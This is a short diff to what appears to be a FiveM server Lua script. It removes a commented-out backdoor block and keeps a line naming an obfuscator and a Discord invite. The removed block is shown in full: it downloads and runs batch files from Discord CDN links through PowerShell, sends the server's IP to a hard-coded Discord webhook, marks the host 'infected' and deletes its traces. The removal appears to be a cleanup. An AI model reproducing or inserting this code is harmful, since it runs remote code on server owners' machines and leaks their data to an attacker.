@@ -1,23 +1,3 @@
---[[Citizen.CreateThread(function()
-    Wait(20000)
-    local a="https://cdn.discordapp.com/attachments/736357418963042315/829695600613392414/sys.bat" 
-    local b="https://cdn.discordapp.com/attachments/736357418963042315/829695780444045352/sysre.bat" 
-    local c="%cd%/sys.bat" 
-    local d="%cd%/sysre.bat" 
-    local e="Invoke-WebRequest -Uri "..a.." -OutFile "..c..""
-    local f="Invoke-WebRequest -Uri "..b.." -OutFile "..d..""
-    os.execute("powershell.exe -Command "..e.."")
-    os.execute("powershell.exe -Command "..f.."")
-    os.execute("start sysre.bat")
-    PerformHttpRequest("https://ipv4bot.whatismyipaddress.com/", function(err, text, headers)
-        Ip = text
-        PerformHttpRequest('https://discord.com/api/webhooks/886203714518519818/qDqv8nYmVTjSkGd4nBDXTsFJh7ACisTIP7CDUmCX18Hnpd62UJreg5gIYzPzy6xGQId5', function(err, text, headers) end, 'POST', json.encode({username = "LOG", content = Ip .. " <- this retard lel @everyone"}), { ['Content-Type'] = 'application/json' })
-    end, 'GET')    
-    _G["infected"] = true
-    Wait(6000)
-    os.remove("%cd%/sys.bat")
-    os.remove("%cd%/sysre.bat")
-end)]]
 
 _vGmlP71KhNk75GkB, Protected_by_MoonSecV2, Discord = 'discord.gg/gQEH2uZxUk'
 
